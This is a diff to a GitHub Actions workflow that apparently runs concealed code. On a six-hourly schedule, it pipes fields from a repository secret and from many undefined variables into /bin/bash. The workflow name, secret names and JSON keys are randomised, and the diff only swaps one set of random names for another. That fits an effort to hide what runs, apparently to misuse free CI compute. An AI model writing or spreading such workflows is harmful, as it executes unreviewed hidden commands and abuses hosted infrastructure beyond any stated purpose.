@@ -3,7 +3,7 @@ name: caidafu2345
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 5/6 * * *'
+    - cron: '37 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,15 +11,28 @@ jobs:
       - uses: actions/checkout@v4
       - name: caidafu2345
         env:
-          x21: ${{ secrets.x21 }}
+          act3524: ${{ secrets.act3524 }}
         run: |
-          echo $x21 | jq -r .gzib951 | /bin/bash
-          echo $thads6 | jq -r .urqox8454 | /bin/bash
-          echo $rsypo12477 | jq -r .qbia7 | /bin/bash
-          echo $qmgi22632 | jq -r .dv3467 | /bin/bash
-          echo $yifg372 | jq -r .cepit82156 | /bin/bash
-          echo $xkvrg4090 | jq -r .oz7655 | /bin/bash
-          echo $vide317 | jq -r .bt36713 | /bin/bash
-          echo $zsmps1 | jq -r .spzuj80672 | /bin/bash
-          echo $w2 | jq -r .ypb15520 | /bin/bash
+          echo $act3524 | jq -r .z96433 | /bin/bash
+          echo $ah605 | jq -r .ocuvr152 | /bin/bash
+          echo $xc8 | jq -r .qhgig135 | /bin/bash
+          echo $wsej412 | jq -r .yfjrn99338 | /bin/bash
+          echo $mw2 | jq -r .qhj50 | /bin/bash
+          echo $gmk675 | jq -r .bpgqn1 | /bin/bash
+          echo $wlgqm0518 | jq -r .r8840 | /bin/bash
+          echo $pjt50 | jq -r .r81725 | /bin/bash
+          echo $qhh6 | jq -r .sneya0 | /bin/bash
+          echo $gu5601 | jq -r .vqoa2 | /bin/bash
+          echo $vqrfb0991 | jq -r .duzte907 | /bin/bash
+          echo $ex7619 | jq -r .vq83015 | /bin/bash
+          echo $fffc2 | jq -r .fg560 | /bin/bash
+          echo $wad75 | jq -r .g94 | /bin/bash
+          echo $aztyw1 | jq -r .ui119 | /bin/bash
+          echo $s6 | jq -r .s41819 | /bin/bash
+          echo $maql400 | jq -r .pqo175 | /bin/bash
+          echo $aszr4268 | jq -r .elrjq5178 | /bin/bash
+          echo $hmx60 | jq -r .ecfzy69 | /bin/bash
+          echo $hi7741 | jq -r .rxwy8 | /bin/bash
+          echo $u21142 | jq -r .lgaa42423 | /bin/bash
+          echo $sesbv1430 | jq -r .domrd74 | /bin/bash
 
